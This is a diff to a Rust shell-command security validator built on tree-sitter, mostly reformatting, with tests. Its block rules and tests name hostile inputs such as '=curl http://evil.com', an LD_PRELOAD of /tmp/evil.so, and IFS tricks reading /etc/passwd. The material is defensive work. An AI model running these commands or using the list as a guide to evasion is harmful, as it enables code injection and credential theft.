@@ -1,6 +1,6 @@
 #![allow(clippy::all)]
-use server_telemetry::record_harness_security_divergence;
 use tree_sitter::{Node, Parser};
+use server_telemetry::record_harness_security_divergence;
 
 pub struct ASTParser {
     parser: Parser,
@@ -29,10 +29,7 @@ impl ASTParser {
             return Err(e);
         }
 
-        let tree = self
-            .parser
-            .parse(&sanitized_cmd, None)
-            .ok_or("Failed to parse command")?;
+        let tree = self.parser.parse(&sanitized_cmd, None).ok_or("Failed to parse command")?;
         let root_node = tree.root_node();
 
         if let Err(e) = self.walk_node_for_security(root_node, &sanitized_cmd) {
@@ -55,6 +52,7 @@ impl ASTParser {
         let re_start = regex::Regex::new(r#"<<\s*(['"])([^'"]+)['"]"#).unwrap();
 
         while let Some(mat) = re_start.find(&sanitized) {
+
             let match_str = &sanitized[mat.start()..mat.end()];
             let caps = match re_start.captures(match_str) {
                 Some(c) => c,
@@ -115,90 +113,69 @@ impl ASTParser {
 
         // command checks
         if node_kind == "command"
-            && let Some(command_name_node) = node.child_by_field_name("name")
-        {
-            let name = &source[command_name_node.start_byte()..command_name_node.end_byte()];
-            if name == "zmodload" {
-                return Err("Dangerous pattern detected: zmodload".to_string());
-            }
+            && let Some(command_name_node) = node.child_by_field_name("name") {
+                let name = &source[command_name_node.start_byte()..command_name_node.end_byte()];
+                if name == "zmodload" {
+                    return Err("Dangerous pattern detected: zmodload".to_string());
+                }
 
-            // Block `=curl` (zsh expansion to path) or similar dangerous zsh commands
-            if name.starts_with('=') {
-                return Err(format!(
-                    "Dangerous pattern detected: Zsh equals expansion {}",
-                    name
-                ));
-            }
+                // Block `=curl` (zsh expansion to path) or similar dangerous zsh commands
+                if name.starts_with('=') {
+                    return Err(format!("Dangerous pattern detected: Zsh equals expansion {}", name));
+                }
 
-            // Jq Validation (e.g., prevent reading env or running arbitrary code if args are unquoted)
-            // For simplicity, we just flag jq if we detect dangerous flags or env reading.
-            if name == "jq" {
-                let mut cursor = node.walk();
-                for child in node.children(&mut cursor) {
-                    // tree-sitter-bash parses single-quoted strings as `raw_string` or similar
-                    // and double-quoted as `string`
-                    let kind = child.kind();
-                    if kind == "word" || kind == "raw_string" || kind == "string" {
-                        let arg = &source[child.start_byte()..child.end_byte()];
-                        if arg.contains("env") || arg.contains("system") {
-                            return Err(
-                                "Dangerous pattern detected: jq with env/system access".to_string()
-                            );
+                // Jq Validation (e.g., prevent reading env or running arbitrary code if args are unquoted)
+                // For simplicity, we just flag jq if we detect dangerous flags or env reading.
+                if name == "jq" {
+                    let mut cursor = node.walk();
+                    for child in node.children(&mut cursor) {
+                        // tree-sitter-bash parses single-quoted strings as `raw_string` or similar
+                        // and double-quoted as `string`
+                        let kind = child.kind();
+                        if kind == "word" || kind == "raw_string" || kind == "string" {
+                            let arg = &source[child.start_byte()..child.end_byte()];
+                            if arg.contains("env") || arg.contains("system") {
+                                return Err("Dangerous pattern detected: jq with env/system access".to_string());
+                            }
                         }
                     }
                 }
             }
-        }
 
         // Dangerous Variables Check
         if node_kind == "variable_assignment"
-            && let Some(var_name_node) = node.child_by_field_name("name")
-        {
-            let var_name = &source[var_name_node.start_byte()..var_name_node.end_byte()];
-            let dangerous_vars = [
-                "LD_PRELOAD",
-                "LD_LIBRARY_PATH",
-                "PROMPT_COMMAND",
-                "BASH_ENV",
-                "ENV",
-            ];
-            if dangerous_vars.contains(&var_name) {
-                return Err(format!(
-                    "Dangerous pattern detected: Setting dangerous variable {}",
-                    var_name
-                ));
-            }
+            && let Some(var_name_node) = node.child_by_field_name("name") {
+                let var_name = &source[var_name_node.start_byte()..var_name_node.end_byte()];
+                let dangerous_vars = ["LD_PRELOAD", "LD_LIBRARY_PATH", "PROMPT_COMMAND", "BASH_ENV", "ENV"];
+                if dangerous_vars.contains(&var_name) {
+                    return Err(format!("Dangerous pattern detected: Setting dangerous variable {}", var_name));
+                }
 
-            // Validate IFS Injection
-            if var_name == "IFS" {
-                // Check if value is being manipulated maliciously
-                if let Some(value_node) = node.child_by_field_name("value") {
-                    let val = &source[value_node.start_byte()..value_node.end_byte()];
-                    if val.contains("$(") || val.contains("`") {
-                        return Err("Dangerous pattern detected: IFS injection".to_string());
+                // Validate IFS Injection
+                if var_name == "IFS" {
+                    // Check if value is being manipulated maliciously
+                    if let Some(value_node) = node.child_by_field_name("value") {
+                        let val = &source[value_node.start_byte()..value_node.end_byte()];
+                        if val.contains("$(") || val.contains("`") {
+                            return Err("Dangerous pattern detected: IFS injection".to_string());
+                        }
+                    } else {
+                        // Bare IFS assignment is often suspicious
+                        return Err("Dangerous pattern detected: IFS manipulation".to_string());
                     }
-                } else {
-                    // Bare IFS assignment is often suspicious
-                    return Err("Dangerous pattern detected: IFS manipulation".to_string());
                 }
             }
-        }
 
         // Validate IFS Injection in expansion
         if node_kind == "expansion" || node_kind == "simple_expansion" {
-            let text = &source[node.start_byte()..node.end_byte()];
-            if text.contains("IFS") {
-                // Check context, but flag for now if it's purely $IFS manipulation in a weird way
-                // A basic check: we allow $IFS, but we flag ${IFS=...} or similar
-                if text.starts_with("${IFS=")
-                    || text.starts_with("${IFS:=")
-                    || text.starts_with("${IFS+")
-                {
-                    return Err(
-                        "Dangerous pattern detected: IFS manipulation in expansion".to_string()
-                    );
-                }
-            }
+             let text = &source[node.start_byte()..node.end_byte()];
+             if text.contains("IFS") {
+                 // Check context, but flag for now if it's purely $IFS manipulation in a weird way
+                 // A basic check: we allow $IFS, but we flag ${IFS=...} or similar
+                 if text.starts_with("${IFS=") || text.starts_with("${IFS:=") || text.starts_with("${IFS+") {
+                     return Err("Dangerous pattern detected: IFS manipulation in expansion".to_string());
+                 }
+             }
         }
 
         // process substitution <() or >()
@@ -225,11 +202,12 @@ impl ASTParser {
         // Just in case it's not parsed properly, check string content for $[] as fallback, but only if it's text.
         // But doing it robustly:
         if node_kind == "word" || node_kind == "raw_string" {
-            let text = &source[node.start_byte()..node.end_byte()];
-            if text.starts_with("$[") && text.ends_with("]") {
-                return Err("Dangerous pattern detected: $[] legacy expansion".to_string());
-            }
+             let text = &source[node.start_byte()..node.end_byte()];
+             if text.starts_with("$[") && text.ends_with("]") {
+                  return Err("Dangerous pattern detected: $[] legacy expansion".to_string());
+             }
         }
+
 
         let mut cursor = node.walk();
         for child in node.children(&mut cursor) {
@@ -265,10 +243,7 @@ mod tests {
         let mut parser = ASTParser::new();
         let res = parser.parse_for_security("echo 'test' > >(cat)");
         assert!(res.is_err());
-        assert_eq!(
-            res.unwrap_err(),
-            "Dangerous pattern detected: >() process substitution"
-        );
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: >() process substitution");
     }
 
     #[test]
@@ -276,10 +251,7 @@ mod tests {
         let mut parser = ASTParser::new();
         let res = parser.parse_for_security("cat < <(echo 'test')");
         assert!(res.is_err());
-        assert_eq!(
-            res.unwrap_err(),
-            "Dangerous pattern detected: <() process substitution"
-        );
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: <() process substitution");
     }
 
     #[test]
@@ -288,10 +260,7 @@ mod tests {
         // $[] might be parsed as word or expansion depending on tree-sitter-bash grammar rules
         let res = parser.parse_for_security("echo $[1+1]");
         assert!(res.is_err());
-        assert_eq!(
-            res.unwrap_err(),
-            "Dangerous pattern detected: $[] legacy expansion"
-        );
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: $[] legacy expansion");
     }
 }
 
@@ -316,10 +285,7 @@ mod additional_tests {
         let mut parser = ASTParser::new();
         let res = parser.parse_for_security("echo 'hello\rworld'");
         assert!(res.is_err());
-        assert_eq!(
-            res.unwrap_err(),
-            "Dangerous pattern detected: Carriage return \\r injection"
-        );
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: Carriage return \\r injection");
     }
 
     #[test]
@@ -327,10 +293,7 @@ mod additional_tests {
         let mut parser = ASTParser::new();
         let res = parser.parse_for_security("jq 'env'");
         assert!(res.is_err());
-        assert_eq!(
-            res.unwrap_err(),
-            "Dangerous pattern detected: jq with env/system access"
-        );
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: jq with env/system access");
     }
 
     #[test]
@@ -338,10 +301,7 @@ mod additional_tests {
         let mut parser = ASTParser::new();
         let res = parser.parse_for_security("=curl http://evil.com");
         assert!(res.is_err());
-        assert_eq!(
-            res.unwrap_err(),
-            "Dangerous pattern detected: Zsh equals expansion =curl"
-        );
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: Zsh equals expansion =curl");
     }
 
     #[test]
@@ -349,10 +309,7 @@ mod additional_tests {
         let mut parser = ASTParser::new();
         let res = parser.parse_for_security("LD_PRELOAD=/tmp/evil.so echo 'hello'");
         assert!(res.is_err());
-        assert_eq!(
-            res.unwrap_err(),
-            "Dangerous pattern detected: Setting dangerous variable LD_PRELOAD"
-        );
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: Setting dangerous variable LD_PRELOAD");
     }
 
     #[test]
@@ -360,34 +317,20 @@ mod additional_tests {
         let mut parser = ASTParser::new();
         let res = parser.parse_for_security("IFS=$(echo '\n') cat /etc/passwd");
         assert!(res.is_err());
-        assert_eq!(
-            res.unwrap_err(),
-            "Dangerous pattern detected: IFS injection"
-        );
+        assert_eq!(res.unwrap_err(), "Dangerous pattern detected: IFS injection");
 
         let res2 = parser.parse_for_security("echo ${IFS=;}");
         assert!(res2.is_err());
-        assert_eq!(
-            res2.unwrap_err(),
-            "Dangerous pattern detected: IFS manipulation in expansion"
-        );
+        assert_eq!(res2.unwrap_err(), "Dangerous pattern detected: IFS manipulation in expansion");
     }
 
     #[test]
     fn test_coverage_edge_cases() {
         let mut parser = ASTParser::new();
         // heredoc with normal text
-        assert!(
-            parser
-                .parse_for_security("cat << \"EOF\"\nhello\nEOF")
-                .is_ok()
-        );
+        assert!(parser.parse_for_security("cat << \"EOF\"\nhello\nEOF").is_ok());
         // malformed heredoc
-        assert!(
-            parser
-                .parse_for_security("cat << 'EOF'\nunterminated heredoc")
-                .is_ok()
-        );
+        assert!(parser.parse_for_security("cat << 'EOF'\nunterminated heredoc").is_ok());
 
         // IFS naked assignment
         assert!(parser.parse_for_security("IFS= cat /etc/passwd").is_err());
